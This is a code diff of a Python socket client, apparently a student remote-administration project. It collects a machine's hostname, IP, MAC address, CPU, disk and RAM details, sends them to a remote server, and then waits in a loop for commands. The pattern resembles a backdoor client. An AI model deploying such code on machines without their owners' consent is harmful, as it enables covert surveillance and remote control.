@@ -1,5 +1,6 @@
 import getpass
 import re
+import threading
 import uuid
 from socket import *
 import platform
@@ -36,38 +37,6 @@ while True:
         continue
 
     break
-
-clientSocket.send(platform.node().encode())
-clientSocket.send(platform.release().encode)
-clientSocket.send(gethostbyname(gethostname()).encode())
-clientSocket.send(':'.join(re.findall('..', '%012x' % uuid.getnode())))
-clientSocket.send(platform.version().encode())
-clientSocket.send(platform.processor().encode)
-clientSocket.send(psutil.cpu_count(logical=False).encode)
-clientSocket.send(psutil.cpu_count(logical=True).encode)
-partitions = psutil.disk_partitions()
-diskinfo = ''
-for partition in partitions:
-    diskinfo += " Device: " + partition.device + "\n"
-    diskinfo += " Mountpoint: " + partition.mountpoint + "\n"
-    diskinfo += " File system type: " + partition.fstype + "\n"
-    try:
-        partition_usage = psutil.disk_usage(partition.mountpoint)
-    except PermissionError:
-        # this can be catched due to the disk that
-        # isn't ready
-        continue
-    diskinfo += " Total Size: " + get_size(partition_usage.total) + "\n"
-    diskinfo += " Used: " + get_size(partition_usage.used) + "\n"
-    diskinfo += " Free: " + get_size(partition_usage.free) + "\n"
-    diskinfo += " Percentage: " + str(partition_usage.percent) + "%\n"
-clientSocket.send(diskinfo.encode)
-
-ram = 'RAM: ' + str(int(psutil.virtual_memory().total / 1024.0 ** 3)) + 'GB'
-clientSocket.send(ram)
-
-"""
-#VECCHIO CODICE
 node = platform.node()
 release = platform.release()
 ipaddr = gethostbyname(gethostname())
@@ -105,9 +74,7 @@ info += '\nMAC Address: ' + macaddr
 info += '\nRAM: ' + str(int(psutil.virtual_memory().total / 1024.0 ** 3)) + 'GB'
 info += '\nDisk info: ' + diskinfo
 
-
 clientSocket.send(info.encode())
-"""
 ack = clientSocket.recv(1024).decode()
 command = clientSocket.recv(2048).decode()
 while command != 'exit':
